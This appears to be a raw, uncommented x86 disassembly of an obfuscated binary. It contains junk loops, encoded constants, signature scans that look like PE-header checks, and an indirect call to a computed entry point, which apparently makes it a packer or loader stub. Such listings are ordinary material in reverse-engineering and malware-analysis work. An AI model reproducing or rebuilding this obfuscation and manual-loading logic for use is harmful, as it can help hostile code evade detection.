  42285d:	mov    eax,DWORD PTR [ebp+0x18]
  422860:	cmp    eax,esi
  422862:	mov    DWORD PTR ds:0x42864f,0x3fa2
  42286c:	jne    0x422890
  422872:	mov    DWORD PTR ds:0x42860b,0x3d29
  42287c:	push   0xf89c85b1
  422881:	mov    DWORD PTR ds:0x42866b,0x6bac
  42288b:	jmp    0x422ad4
  422890:	mov    esi,DWORD PTR [ebp+0x18]
  422893:	mov    eax,0x14b4
  422898:	mov    eax,0xf89c85b2
  42289d:	cmp    esi,eax
  42289f:	jne    0x422ac4
  4228a5:	mov    eax,DWORD PTR [ebp+0x10]
  4228a8:	adc    DWORD PTR ds:0x4285cf,0x1af0
  4228b2:	xor    eax,ecx
  4228b4:	mov    esi,DWORD PTR ds:0x4285ef
  4228ba:	sub    DWORD PTR ds:0x42860f,esi
  4228c0:	add    eax,edx
  4228c2:	and    DWORD PTR ds:0x42863f,0x0
  4228cc:	jmp    0x4228e0
  4228d1:	xor    esi,esi
  4228d3:	xor    esi,DWORD PTR ds:0x42863f
  4228d9:	inc    esi
  4228da:	mov    DWORD PTR ds:0x42863f,esi
  4228e0:	cmp    DWORD PTR ds:0x42863f,0x1d
  4228e7:	jae    0x422929
  4228ed:	cmp    DWORD PTR ds:0x42863f,0xa
  4228f4:	jl     0x422929
  4228fa:	jmp    0x42290a
  4228ff:	push   0x428028
  422904:	call   DWORD PTR ds:0x4287af
  42290a:	cmp    DWORD PTR ds:0x42863f,0x9
  422911:	jne    0x422924
  422917:	mov    esi,DWORD PTR ds:0x42863f
  42291d:	inc    esi
  42291e:	mov    DWORD PTR ds:0x42863f,esi
  422924:	jmp    0x4228d1
  422929:	mov    DWORD PTR [ebp-0x18],eax
  42292c:	mov    eax,DWORD PTR [ebp+0xc]
  42292f:	mov    esi,DWORD PTR [ebp-0x8]
  422932:	xor    eax,ecx
  422934:	add    eax,edx
  422936:	imul   eax,DWORD PTR [esi]
  422939:	mov    esi,DWORD PTR [ebp+0x8]
  42293c:	xor    esi,ecx
  42293e:	add    esi,edx
  422940:	cmp    esi,eax
  422942:	mov    eax,DWORD PTR [ebp-0x4]
  422945:	push   ebx
  422946:	je     0x422965
  42294c:	mov    esi,DWORD PTR [ebp-0x18]
  42294f:	add    DWORD PTR [eax],esi
  422951:	mov    eax,DWORD PTR [ebp-0x4]
  422954:	mov    esi,DWORD PTR [ebp+0xc]
  422957:	xor    esi,ecx
  422959:	add    esi,edx
  42295b:	imul   esi,DWORD PTR [eax]
  42295e:	mov    DWORD PTR [eax],esi
  422960:	jmp    0x42296a
  422965:	mov    esi,DWORD PTR [ebp+0x14]
  422968:	xor    DWORD PTR [eax],esi
  42296a:	mov    eax,DWORD PTR [ebp-0x4]
  42296d:	mov    edi,DWORD PTR [ebp+0x10]
  422970:	xor    edi,ecx
  422972:	mov    esi,0xffcd8d14
  422977:	mov    ebx,esi
  422979:	sub    ebx,edi
  42297b:	add    DWORD PTR [eax],ebx
  42297d:	mov    eax,DWORD PTR [ebp-0x4]
  422980:	mov    edi,DWORD PTR [ebp-0x8]
  422983:	add    edi,DWORD PTR [eax]
  422985:	mov    DWORD PTR [ebp-0x8],edi
  422988:	mov    eax,DWORD PTR [ebp+0xc]
  42298b:	mov    edi,DWORD PTR [ebp+0xc]
  42298e:	xor    edi,ecx
  422990:	xor    eax,ecx
  422992:	lea    eax,[eax+edi*1+0x64e5d8]
  422999:	mov    edi,DWORD PTR [ebp+0xc]
  42299c:	xor    edi,ecx
  42299e:	add    edi,edx
  4229a0:	imul   eax,edi
  4229a3:	mov    edi,DWORD PTR [ebp+0xc]
  4229a6:	xor    edi,ecx
  4229a8:	sub    edi,eax
  4229aa:	mov    eax,DWORD PTR [ebp-0x4]
  4229ad:	add    edi,edx
  4229af:	cmp    DWORD PTR [eax],edi
  4229b1:	mov    eax,DWORD PTR [ebp-0x4]
  4229b4:	mov    edi,DWORD PTR [ebp+0x10]
  4229b7:	jg     0x4229ca
  4229bd:	xor    edi,ecx
  4229bf:	mov    ebx,esi
  4229c1:	sub    ebx,edi
  4229c3:	add    DWORD PTR [eax],ebx
  4229c5:	jmp    0x4229d0
  4229ca:	xor    edi,ecx
  4229cc:	add    edi,edx
  4229ce:	add    DWORD PTR [eax],edi
  4229d0:	mov    eax,DWORD PTR [ebp-0x8]
  4229d3:	mov    edi,DWORD PTR [ebp-0x10]
  4229d6:	mov    eax,DWORD PTR [eax]
  4229d8:	xor    edi,ecx
  4229da:	add    edi,0x3272eb
  4229e0:	not    edi
  4229e2:	and    eax,edi
  4229e4:	movsx  di,BYTE PTR [eax+0x1]
  4229e9:	mov    ebx,0x3b56
  4229ee:	sub    di,bx
  4229f1:	mov    ebx,0x8a94
  4229f6:	xor    di,bx
  4229f9:	mov    ebx,0x4f90
  4229fe:	cmp    di,bx
  422a01:	jne    0x422a29
  422a07:	movsx  di,BYTE PTR [eax]
  422a0b:	mov    ebx,0x3b56
  422a10:	sub    di,bx
  422a13:	mov    ebx,0x8a94
  422a18:	xor    di,bx
  422a1b:	mov    ebx,0x4e63
  422a20:	cmp    di,bx
  422a23:	je     0x422a39
  422a29:	mov    edi,DWORD PTR [ebp-0x10]
  422a2c:	xor    edi,ecx
  422a2e:	mov    ebx,esi
  422a30:	sub    ebx,edi
  422a32:	add    eax,ebx
  422a34:	jmp    0x4229e4
  422a39:	mov    esi,DWORD PTR [ebp-0x14]
  422a3c:	mov    esi,DWORD PTR [esi]
  422a3e:	mov    edi,DWORD PTR [eax+0x3c]
  422a41:	lea    esi,[edi+esi*8+0x78]
  422a45:	mov    esi,DWORD PTR [esi+eax*1]
  422a48:	mov    DWORD PTR [ebp-0x8],esi
  422a4b:	mov    esi,DWORD PTR [ebp+0x8]
  422a4e:	xor    esi,ecx
  422a50:	add    esi,edx
  422a52:	mov    DWORD PTR [ebp-0x14],esi
  422a55:	mov    esi,DWORD PTR [ebp+0x8]
  422a58:	mov    edi,DWORD PTR [ebp-0x8]
  422a5b:	xor    esi,ecx
  422a5d:	add    esi,edx
  422a5f:	pop    ebx
  422a60:	cmp    edi,esi
  422a62:	jne    0x422a80
  422a68:	mov    eax,DWORD PTR [ebp+0xc]
  422a6b:	xor    eax,ecx
  422a6d:	mov    ecx,DWORD PTR [ebp-0x8]
  422a70:	add    eax,edx
  422a72:	imul   eax,ecx
  422a75:	mov    DWORD PTR [ebp-0x8],eax
  422a78:	push   DWORD PTR [ebp+0x18]
  422a7b:	jmp    0x422ad4
  422a80:	mov    ecx,DWORD PTR [ebp-0x8]
  422a83:	add    ecx,eax
  422a85:	mov    DWORD PTR [ebp-0x14],ecx
  422a88:	mov    ecx,DWORD PTR [ebp-0x14]
  422a8b:	mov    ecx,DWORD PTR [ecx+0xc]
  422a8e:	movsx  cx,BYTE PTR [ecx+eax*1]
  422a93:	mov    edx,0x3b56
  422a98:	sub    cx,dx
  422a9b:	mov    edx,0x8a94
  422aa0:	xor    cx,dx
  422aa3:	mov    edx,0x4e61
  422aa8:	cmp    cx,dx
  422aab:	jne    0x422a78
  422ab1:	mov    ecx,DWORD PTR ds:0x4282ef
  422ab7:	mov    ecx,DWORD PTR [ecx+0x198]
  422abd:	mov    DWORD PTR [ecx],eax
  422abf:	jmp    0x422ae5
  422ac4:	mov    ecx,DWORD PTR [ebp+0x18]
  422ac7:	cmp    ecx,0xf89c85b1
  422acd:	jne    0x422ae5
  422ad3:	push   eax
  422ad4:	push   DWORD PTR [ebp+0x14]
  422ad7:	push   DWORD PTR [ebp+0x10]
  422ada:	push   DWORD PTR [ebp+0xc]
  422add:	push   DWORD PTR [ebp+0x8]
  422ae0:	call   0x42252e
  422ae5:	pop    edi
  422ae6:	pop    esi
  422ae7:	leave  
  422ae8:	ret    0x14
  422aeb:	push   ebp
  422aec:	mov    ebp,esp
  422aee:	sub    esp,0x54
  422af1:	add    DWORD PTR ds:0x428657,0x428603
  422afb:	push   0x4283ff
  422b00:	call   DWORD PTR ds:0x4287cf
  422b06:	sbb    DWORD PTR ds:0x428647,0x42860b
  422b10:	test   eax,eax
  422b12:	je     0x422b29
  422b18:	xor    eax,eax
  422b1a:	mov    DWORD PTR ds:0x428677,0x34e1
  422b24:	jmp    0x423411
  422b29:	mov    DWORD PTR [ebp-0x2c],0x0
  422b30:	xor    ecx,0x686a
  422b36:	mov    eax,DWORD PTR [ebp-0x20]
  422b39:	mov    DWORD PTR [ebp-0x20],eax
  422b3c:	mov    ecx,0xf89c85b0
  422b41:	and    DWORD PTR ds:0x428647,0x0
  422b4b:	mov    edx,DWORD PTR ds:0x428647
  422b51:	inc    edx
  422b52:	mov    DWORD PTR ds:0x428647,edx
  422b58:	cmp    DWORD PTR ds:0x428647,0x27
  422b5f:	jge    0x422b85
  422b65:	jmp    0x422b78
  422b6a:	push   DWORD PTR [ebp-0xc]
  422b6d:	push   0x4285eb
  422b72:	call   DWORD PTR ds:0x4287b3
  422b78:	cmp    DWORD PTR ds:0x428647,0x19
  422b7f:	jb     0x422b4b
  422b85:	mov    DWORD PTR [ebp-0x4],ecx
  422b88:	and    DWORD PTR ds:0x428647,0x0
  422b92:	xor    edx,edx
  422b94:	or     edx,DWORD PTR ds:0x428647
  422b9a:	inc    edx
  422b9b:	mov    DWORD PTR ds:0x428647,edx
  422ba1:	cmp    DWORD PTR ds:0x428647,0xc
  422ba8:	jl     0x422be0
  422bae:	jmp    0x422bb9
  422bb3:	call   DWORD PTR ds:0x4287b7
  422bb9:	cmp    DWORD PTR ds:0x428647,0xb
  422bc0:	jne    0x422bd3
  422bc6:	mov    edx,DWORD PTR ds:0x428647
  422bcc:	inc    edx
  422bcd:	mov    DWORD PTR ds:0x428647,edx
  422bd3:	cmp    DWORD PTR ds:0x428647,0x1f
  422bda:	jb     0x422b92
  422be0:	mov    DWORD PTR [ebp-0x8],0xf89c85b1
  422be7:	lea    eax,[ebp-0x14]
  422bea:	xor    edx,DWORD PTR ds:0x42866b
  422bf0:	mov    DWORD PTR [ebp-0x2c],eax
  422bf3:	movzx  edx,BYTE PTR ds:0x428667
  422bfa:	add    DWORD PTR ds:0x4285d7,edx
  422c00:	lea    eax,[ebp-0x18]
  422c03:	mov    DWORD PTR [ebp-0x24],eax
  422c06:	movzx  eax,WORD PTR ds:0x428607
  422c0d:	add    DWORD PTR ds:0x428603,eax
  422c13:	mov    eax,ds:0x4282ef
  422c18:	neg    edx
  422c1a:	mov    eax,DWORD PTR [eax+0x1c8]
  422c20:	and    DWORD PTR ds:0x4285e7,0x0
  422c2a:	xor    edx,edx
  422c2c:	add    edx,DWORD PTR ds:0x4285e7
  422c32:	inc    edx
  422c33:	mov    DWORD PTR ds:0x4285e7,edx
  422c39:	cmp    DWORD PTR ds:0x4285e7,0x9
  422c40:	jl     0x422c7b
  422c46:	jmp    0x422c54
  422c4b:	push   DWORD PTR [ebp-0x18]
  422c4e:	call   DWORD PTR ds:0x4287bb
  422c54:	cmp    DWORD PTR ds:0x4285e7,0x8
  422c5b:	jne    0x422c6e
  422c61:	mov    edx,DWORD PTR ds:0x4285e7
  422c67:	inc    edx
  422c68:	mov    DWORD PTR ds:0x4285e7,edx
  422c6e:	cmp    DWORD PTR ds:0x4285e7,0x1b
  422c75:	jb     0x422c2a
  422c7b:	mov    eax,DWORD PTR [eax]
  422c7d:	adc    edx,0x4266
  422c83:	mov    edx,DWORD PTR [ebp-0x24]
  422c86:	push   ebx
  422c87:	push   esi
  422c88:	push   edi
  422c89:	xor    DWORD PTR ds:0x42865b,0x2427
  422c93:	mov    edi,0x75108a4
  422c98:	and    DWORD PTR ds:0x42867b,0x0
  422ca2:	xor    ebx,ebx
  422ca4:	or     ebx,DWORD PTR ds:0x42867b
  422caa:	inc    ebx
  422cab:	mov    DWORD PTR ds:0x42867b,ebx
  422cb1:	cmp    DWORD PTR ds:0x42867b,0x18
  422cb8:	jg     0x422cf0
  422cbe:	jmp    0x422ce3
  422cc3:	push   0x7b2e
  422cc8:	push   0x428028
  422ccd:	push   DWORD PTR [ebp-0x20]
  422cd0:	push   0x42800b
  422cd5:	push   0x82c9
  422cda:	push   DWORD PTR [ebp-0x10]
  422cdd:	call   DWORD PTR ds:0x4287bf
  422ce3:	cmp    DWORD PTR ds:0x42867b,0x10
  422cea:	jb     0x422ca2
  422cf0:	xor    eax,edi
  422cf2:	mov    ebx,0x3272ec
  422cf7:	sbb    DWORD PTR ds:0x4285ef,0x42860b
  422d01:	add    eax,ebx
  422d03:	mov    DWORD PTR [edx],eax
  422d05:	mov    eax,ds:0x4284f3
  422d0a:	cmp    eax,0x445cecf9
  422d0f:	jne    0x422dd7
  422d15:	sbb    DWORD PTR ds:0x42860f,0x5794
  422d1f:	mov    eax,DWORD PTR [ebp-0x4]
  422d22:	mov    esi,DWORD PTR ds:0x42864b
  422d28:	or     esi,DWORD PTR ds:0x4285cf
  422d2e:	mov    DWORD PTR ds:0x42864b,esi
  422d34:	mov    edx,DWORD PTR ds:0x4282ef
  422d3a:	xor    DWORD PTR ds:0x42863f,0x1fa5
  422d44:	mov    edx,DWORD PTR [edx+0x198]
  422d4a:	xor    DWORD PTR ds:0x42864f,ecx
  422d50:	xor    eax,edi
  422d52:	add    eax,ebx
  422d54:	mov    DWORD PTR [edx],eax
  422d56:	sub    DWORD PTR ds:0x428617,edx
  422d5c:	mov    eax,DWORD PTR [ebp-0x4]
  422d5f:	mov    edx,DWORD PTR ds:0x428637
  422d65:	add    DWORD PTR ds:0x428663,edx
  422d6b:	xor    eax,edi
  422d6d:	and    DWORD PTR ds:0x42867b,0x0
  422d77:	xor    edx,edx
  422d79:	or     edx,DWORD PTR ds:0x42867b
  422d7f:	inc    edx
  422d80:	mov    DWORD PTR ds:0x42867b,edx
  422d86:	cmp    DWORD PTR ds:0x42867b,0xb
  422d8d:	jg     0x422dca
  422d93:	jmp    0x422da3
  422d98:	push   0x4280a2
  422d9d:	call   DWORD PTR ds:0x4287c3
  422da3:	cmp    DWORD PTR ds:0x42867b,0xa
  422daa:	jne    0x422dbd
  422db0:	mov    edx,DWORD PTR ds:0x42867b
  422db6:	inc    edx
  422db7:	mov    DWORD PTR ds:0x42867b,edx
  422dbd:	cmp    DWORD PTR ds:0x42867b,0x18
  422dc4:	jb     0x422d77
  422dca:	add    eax,ebx
  422dcc:	sub    DWORD PTR ds:0x428627,ecx
  422dd2:	mov    ds:0x4284f3,eax
  422dd7:	mov    edx,DWORD PTR ds:0x4285e7
  422ddd:	and    edx,DWORD PTR ds:0x428617
  422de3:	mov    DWORD PTR ds:0x4285e7,edx
  422de9:	mov    eax,ds:0x4282ef
  422dee:	xor    edx,DWORD PTR ds:0x42865f
  422df4:	mov    eax,DWORD PTR [eax+0x18c]
  422dfa:	sbb    edx,0x43ef
  422e00:	mov    eax,DWORD PTR [eax]
  422e02:	adc    edx,esi
  422e04:	mov    DWORD PTR [ebp-0x34],eax
  422e07:	mov    eax,0xf89c85bc
  422e0c:	mov    DWORD PTR [ebp-0x24],eax
  422e0f:	and    DWORD PTR ds:0x42861f,0x0
  422e19:	mov    edx,DWORD PTR ds:0x42861f
  422e1f:	inc    edx
  422e20:	mov    DWORD PTR ds:0x42861f,edx
  422e26:	cmp    DWORD PTR ds:0x42861f,0x1e
  422e2d:	jle    0x422e67
  422e33:	jmp    0x422e5a
  422e38:	push   0x4285cf
  422e3d:	push   0x2375
  422e42:	push   0x5548
  422e47:	push   0x51cc
  422e4c:	push   0x80b2
  422e51:	push   DWORD PTR [ebp-0x28]
  422e54:	call   DWORD PTR ds:0x4287c7
  422e5a:	cmp    DWORD PTR ds:0x42861f,0x17
  422e61:	jb     0x422e19
  422e67:	mov    DWORD PTR [ebp-0x24],eax
  422e6a:	mov    DWORD PTR ds:0x42866b,0x46d0
  422e74:	mov    DWORD PTR [ebp-0x24],eax
  422e77:	xor    esi,esi
  422e79:	or     esi,DWORD PTR ds:0x4285ef
  422e7f:	sub    DWORD PTR ds:0x428673,esi
  422e85:	mov    DWORD PTR [ebp-0x24],ecx
  422e88:	mov    DWORD PTR [ebp-0x38],eax
  422e8b:	and    esi,0x6095
  422e91:	mov    DWORD PTR [ebp-0x38],0xf89c85b8
  422e98:	sub    DWORD PTR ds:0x428653,edi
  422e9e:	mov    esi,DWORD PTR [ebp-0x4]
  422ea1:	mov    ecx,DWORD PTR [ebp-0x8]
  422ea4:	mov    edx,DWORD PTR ds:0x4286a7
  422eaa:	mov    edx,DWORD PTR [edx]
  422eac:	xor    DWORD PTR ds:0x4285cf,edx
  422eb2:	mov    edx,DWORD PTR [ebp-0x8]
  422eb5:	xor    edx,edi
  422eb7:	xor    ecx,edi
  422eb9:	add    DWORD PTR ds:0x42861f,0x42860f
  422ec3:	add    ecx,edx
  422ec5:	sbb    edx,0x585b
  422ecb:	mov    edx,DWORD PTR [ebp-0x8]
  422ece:	xor    esi,edi
  422ed0:	xor    edx,edi
  422ed2:	adc    DWORD PTR ds:0x428647,0x7d1c
  422edc:	add    esi,ebx
  422ede:	mov    DWORD PTR ds:0x428607,0x675c
  422ee8:	lea    ecx,[ecx+edx*1+0x9758c4]
  422eef:	mov    DWORD PTR ds:0x428647,0x161d
  422ef9:	cmp    esi,ecx
  422efb:	mov    DWORD PTR ds:0x42861b,0x50e4
  422f05:	ja     0x423024
  422f0b:	xor    DWORD PTR ds:0x4285cf,0x42862b
  422f15:	mov    eax,DWORD PTR [ebp-0x8]
  422f18:	sbb    DWORD PTR ds:0x42866b,0x4285eb
  422f22:	xor    eax,edi
  422f24:	and    DWORD PTR ds:0x428633,0x42865b
  422f2e:	lea    eax,[eax+esi*1+0x3272ec]
  422f35:	push   eax
  422f36:	mov    eax,DWORD PTR [ebp-0x24]
  422f39:	xor    DWORD PTR ds:0x42863b,0x428647
  422f43:	xor    eax,edi
  422f45:	sbb    DWORD PTR ds:0x4285f7,0x428637
  422f4f:	lea    eax,[ebp+eax*1+0x3272f4]
  422f56:	push   eax
  422f57:	xor    eax,eax
  422f59:	add    eax,DWORD PTR ds:0x428653
  422f5f:	or     DWORD PTR ds:0x4285ef,eax
  422f65:	mov    eax,ds:0x4282ef
  422f6a:	push   DWORD PTR [eax+0x1bc]
  422f70:	call   0x40aa5b
  422f75:	and    DWORD PTR ds:0x428673,0x0
  422f7f:	mov    eax,ds:0x428673
  422f84:	inc    eax
  422f85:	mov    ds:0x428673,eax
  422f8a:	cmp    DWORD PTR ds:0x428673,0x2d
  422f91:	jb     0x422fb9
  422f97:	jmp    0x422fac
  422f9c:	push   0x428657
  422fa1:	push   0x4280ae
  422fa6:	call   DWORD PTR ds:0x4287cb
  422fac:	cmp    DWORD PTR ds:0x428673,0x1d
  422fb3:	jb     0x422f7f
  422fb9:	mov    eax,DWORD PTR [ebp-0x8]
  422fbc:	or     ecx,0x5d69
  422fc2:	xor    eax,edi
  422fc4:	lea    esi,[esi+eax*1+0x3272ec]
  422fcb:	not    ecx
  422fcd:	mov    eax,DWORD PTR [ebp-0x8]
  422fd0:	mov    DWORD PTR ds:0x42860b,0x501a
  422fda:	mov    ecx,DWORD PTR [ebp-0x8]
  422fdd:	xor    ecx,edi
  422fdf:	sbb    DWORD PTR ds:0x428667,0x42864b
  422fe9:	xor    eax,edi
  422feb:	sbb    DWORD PTR ds:0x4285ef,0xbec
  422ff5:	add    eax,ecx
  422ff7:	mov    ecx,DWORD PTR [ebp-0x8]
  422ffa:	xor    ecx,edi
  422ffc:	mov    DWORD PTR ds:0x4285e3,0x1b1e
  423006:	lea    eax,[eax+ecx*1+0x9758c4]
  42300d:	cmp    esi,eax
  42300f:	mov    DWORD PTR ds:0x42865b,0x1916
  423019:	jbe    0x422f0b
  42301f:	mov    eax,0xf89c85bc
  423024:	mov    ecx,DWORD PTR [ebp+0xc]
  423027:	mov    DWORD PTR ds:0x428173,ecx
  42302d:	or     DWORD PTR ds:0x4285ff,ebx
  423033:	mov    ecx,DWORD PTR [ebp+0x10]
  423036:	or     DWORD PTR ds:0x4285d7,ebx
  42303c:	mov    DWORD PTR ds:0x4283c7,ecx
  423042:	mov    DWORD PTR ds:0x42862b,0x16
  42304c:	cmp    DWORD PTR ds:0x42862b,0x0
  423053:	je     0x423098
  423059:	cmp    DWORD PTR ds:0x42862b,0x1e
  423060:	jg     0x423098
  423066:	jmp    0x423086
  42306b:	push   0x2088
  423070:	push   DWORD PTR [ebp-0x10]
  423073:	push   0x46c3
  423078:	push   0x5611
  42307d:	push   DWORD PTR [ebp-0x20]
  423080:	call   DWORD PTR ds:0x42879f
  423086:	mov    edx,DWORD PTR ds:0x42862b
  42308c:	dec    edx
  42308d:	mov    DWORD PTR ds:0x42862b,edx
  423093:	jmp    0x42304c
  423098:	mov    ecx,DWORD PTR ds:0x428173
  42309e:	mov    DWORD PTR ds:0x428673,0x6c19
  4230a8:	mov    edx,DWORD PTR [ebp-0x2c]
  4230ab:	and    DWORD PTR ds:0x42864f,0x1852
  4230b5:	sub    ecx,ebx
  4230b7:	sbb    DWORD PTR ds:0x428663,0x32b3
  4230c1:	xor    ecx,edi
  4230c3:	mov    DWORD PTR ds:0x4285d7,0x3bce
  4230cd:	mov    DWORD PTR [edx],ecx
  4230cf:	mov    edx,DWORD PTR [ebp-0x20]
  4230d2:	mov    ecx,DWORD PTR ds:0x4285eb
  4230d8:	mov    ecx,0xf89c85b0
  4230dd:	cmp    edx,ecx
  4230df:	mov    DWORD PTR ds:0x428637,0x7ca2
  4230e9:	jne    0x4231ff
  4230ef:	lea    eax,[ebp-0x10]
  4230f2:	mov    DWORD PTR [ebp-0x40],eax
  4230f5:	and    DWORD PTR ds:0x4285df,0x428623
  4230ff:	lea    eax,[ebp+0x4]
  423102:	xor    DWORD PTR ds:0x428603,0x2610
  42310c:	mov    DWORD PTR [ebp-0x10],eax
  42310f:	mov    eax,DWORD PTR [ebp-0x10]
  423112:	test   eax,eax
  423114:	je     0x4233f3
  42311a:	movzx  eax,WORD PTR ds:0x42867b
  423121:	sub    DWORD PTR ds:0x42860b,eax
  423127:	mov    eax,DWORD PTR [ebp-0xc]
  42312a:	and    ecx,0x315b
  423130:	mov    eax,DWORD PTR [ebp-0x8]
  423133:	sbb    DWORD PTR ds:0x428633,edi
  423139:	mov    eax,DWORD PTR [ebp-0x4]
  42313c:	mov    ecx,DWORD PTR ds:0x42868f
  423142:	xor    esi,esi
  423144:	add    esi,DWORD PTR ds:0x42872b
  42314a:	sub    esi,ecx
  42314c:	imul   ecx,DWORD PTR [ecx+esi*1]
  423150:	mov    DWORD PTR [ebp+0xc],eax
  423153:	xor    ecx,esi
  423155:	mov    eax,eax
  423157:	mov    eax,ds:0x4282ef
  42315c:	mov    eax,DWORD PTR [eax+0x1c8]
  423162:	mov    eax,DWORD PTR [eax]
  423164:	cdq    
  423165:	mov    esi,0xfabdbedd
  42316a:	add    eax,esi
  42316c:	adc    edx,0xffffffff
  42316f:	and    DWORD PTR [ebp-0x38],0x0
  423173:	xor    edx,0x0
  423176:	mov    DWORD PTR [ebp-0x24],edx
  423179:	mov    edx,DWORD PTR [ebp+0xc]
  42317c:	mov    DWORD PTR [ebp-0x3c],edx
  42317f:	mov    ecx,0x8a29a137
  423184:	xor    eax,ecx
  423186:	add    DWORD PTR [ebp-0x3c],esi
  423189:	mov    edx,DWORD PTR [ebp-0x3c]
  42318c:	adc    DWORD PTR [ebp-0x38],0xffffffff
  423190:	xor    edx,ecx
  423192:	mov    DWORD PTR [ebp-0x30],edx
  423195:	mov    edx,DWORD PTR [ebp-0x38]
  423198:	xor    edx,0x0
  42319b:	mov    DWORD PTR [ebp-0x2c],edx
  42319e:	cmp    DWORD PTR [ebp-0x30],eax
  4231a1:	jne    0x4231b2
  4231a7:	mov    eax,DWORD PTR [ebp-0x24]
  4231aa:	cmp    edx,eax
  4231ac:	je     0x4231df
  4231b2:	mov    eax,ds:0x4282ef
  4231b7:	mov    eax,DWORD PTR [eax+0x1c0]
  4231bd:	mov    eax,DWORD PTR [eax]
  4231bf:	xor    edx,edx
  4231c1:	add    eax,esi
  4231c3:	adc    edx,0xffffffff
  4231c6:	xor    eax,ecx
  4231c8:	xor    edx,0x0
  4231cb:	cmp    eax,0x70941fe9
  4231d0:	jne    0x4233f3
  4231d6:	cmp    edx,0xffffffff
  4231d9:	jne    0x4233f3
  4231df:	mov    eax,ds:0x42836b
  4231e4:	mov    edx,DWORD PTR ds:0x428373
  4231ea:	xor    eax,edx
  4231ec:	mov    ds:0x42836b,eax
  4231f1:	mov    edx,DWORD PTR ds:0x42836b
  4231f7:	mov    eax,DWORD PTR [ebp-0x10]
  4231fa:	jmp    0x4233b3
  4231ff:	mov    edx,DWORD PTR [ebp-0x14]
  423202:	cmp    edx,0xf89c85b1
  423208:	je     0x423265
  42320e:	mov    edx,DWORD PTR [ebp-0x4]
  423211:	mov    esi,DWORD PTR [ebp-0x18]
  423214:	xor    edx,edi
  423216:	add    edx,ebx
  423218:	cmp    edx,esi
  42321a:	je     0x423265
  423220:	mov    eax,ds:0x4282ef
  423225:	mov    eax,DWORD PTR [eax+0x194]
  42322b:	mov    ecx,DWORD PTR [eax]
  42322d:	mov    eax,DWORD PTR [ecx+0x3c]
  423230:	push   DWORD PTR ds:0x4283c7
  423236:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  42323a:	push   DWORD PTR ds:0x428173
  423240:	add    eax,ecx
  423242:	mov    ecx,DWORD PTR ds:0x4282ef
  423248:	mov    ecx,DWORD PTR [ecx+0x194]
  42324e:	push   DWORD PTR [ecx]
  423250:	call   eax
  423252:	mov    ecx,DWORD PTR ds:0x4282ef
  423258:	mov    ecx,DWORD PTR [ecx+0x1cc]
  42325e:	mov    DWORD PTR [ecx],eax
  423260:	jmp    0x4233f3
  423265:	mov    edx,DWORD PTR [ebp-0x4]
  423268:	mov    esi,DWORD PTR [ebp-0x34]
  42326b:	xor    edx,edi
  42326d:	add    edx,ebx
  42326f:	cmp    edx,esi
  423271:	jne    0x4232ca
  423277:	mov    edx,DWORD PTR [ebp-0x4]
  42327a:	mov    esi,DWORD PTR ds:0x4282ef
  423280:	mov    esi,DWORD PTR [esi+0x198]
  423286:	xor    edx,edi
  423288:	add    edx,ebx
  42328a:	cmp    edx,DWORD PTR [esi]
  42328c:	jne    0x4232a7
  423292:	push   ecx
  423293:	mov    ecx,DWORD PTR [ebp-0x4]
  423296:	xor    ecx,edi
  423298:	add    ecx,ebx
  42329a:	push   ecx
  42329b:	push   eax
  42329c:	push   DWORD PTR [ebp-0x8]
  42329f:	push   DWORD PTR [ebp-0x4]
  4232a2:	call   0x42252e
  4232a7:	push   DWORD PTR [ebp-0x8]
  4232aa:	push   DWORD PTR [ebp-0x4]
  4232ad:	call   0x401000
  4232b2:	mov    eax,DWORD PTR [ebp-0x4]
  4232b5:	xor    eax,edi
  4232b7:	add    eax,ebx
  4232b9:	mov    ds:0x428373,eax
  4232be:	mov    eax,DWORD PTR [ebp-0x4]
  4232c1:	xor    eax,edi
  4232c3:	add    eax,ebx
  4232c5:	mov    ds:0x42836b,eax
  4232ca:	lea    eax,[ebp-0x1c]
  4232cd:	mov    DWORD PTR [ebp-0x44],eax
  4232d0:	lea    eax,[ebp+0x4]
  4232d3:	mov    DWORD PTR [ebp-0x1c],eax
  4232d6:	mov    eax,DWORD PTR [ebp-0x1c]
  4232d9:	test   eax,eax
  4232db:	je     0x4233f3
  4232e1:	mov    DWORD PTR [ebp-0x48],0xf152c39
  4232e8:	mov    DWORD PTR [ebp-0x4c],0x712ed2e
  4232ef:	mov    DWORD PTR [ebp-0x50],0x373fc08
  4232f6:	mov    DWORD PTR [ebp-0x54],0x72670ad8
  4232fd:	call   0x41d64a
  423302:	mov    eax,DWORD PTR [ebp-0xc]
  423305:	mov    eax,DWORD PTR [ebp-0x8]
  423308:	mov    eax,DWORD PTR [ebp-0x4]
  42330b:	mov    DWORD PTR [ebp+0xc],eax
  42330e:	mov    eax,eax
  423310:	mov    eax,ds:0x4282ef
  423315:	mov    eax,DWORD PTR [eax+0x1c8]
  42331b:	mov    eax,DWORD PTR [eax]
  42331d:	cdq    
  42331e:	mov    esi,0xfabdbedd
  423323:	add    eax,esi
  423325:	adc    edx,0xffffffff
  423328:	and    DWORD PTR [ebp-0x38],0x0
  42332c:	xor    edx,0x0
  42332f:	mov    DWORD PTR [ebp-0x24],edx
  423332:	mov    edx,DWORD PTR [ebp+0xc]
  423335:	mov    DWORD PTR [ebp-0x3c],edx
  423338:	mov    ecx,0x8a29a137
  42333d:	xor    eax,ecx
  42333f:	add    DWORD PTR [ebp-0x3c],esi
  423342:	mov    edx,DWORD PTR [ebp-0x3c]
  423345:	adc    DWORD PTR [ebp-0x38],0xffffffff
  423349:	xor    edx,ecx
  42334b:	mov    DWORD PTR [ebp-0x30],edx
  42334e:	mov    edx,DWORD PTR [ebp-0x38]
  423351:	xor    edx,0x0
  423354:	mov    DWORD PTR [ebp-0x2c],edx
  423357:	cmp    DWORD PTR [ebp-0x30],eax
  42335a:	jne    0x42336b
  423360:	mov    eax,DWORD PTR [ebp-0x24]
  423363:	cmp    edx,eax
  423365:	je     0x423398
  42336b:	mov    eax,ds:0x4282ef
  423370:	mov    eax,DWORD PTR [eax+0x1c0]
  423376:	mov    eax,DWORD PTR [eax]
  423378:	xor    edx,edx
  42337a:	add    eax,esi
  42337c:	adc    edx,0xffffffff
  42337f:	xor    eax,ecx
  423381:	xor    edx,0x0
  423384:	cmp    eax,0x70941fe9
  423389:	jne    0x4233f3
  42338f:	cmp    edx,0xffffffff
  423392:	jne    0x4233f3
  423398:	mov    eax,ds:0x42836b
  42339d:	mov    edx,DWORD PTR ds:0x428373
  4233a3:	xor    eax,edx
  4233a5:	mov    ds:0x42836b,eax
  4233aa:	mov    edx,DWORD PTR ds:0x42836b
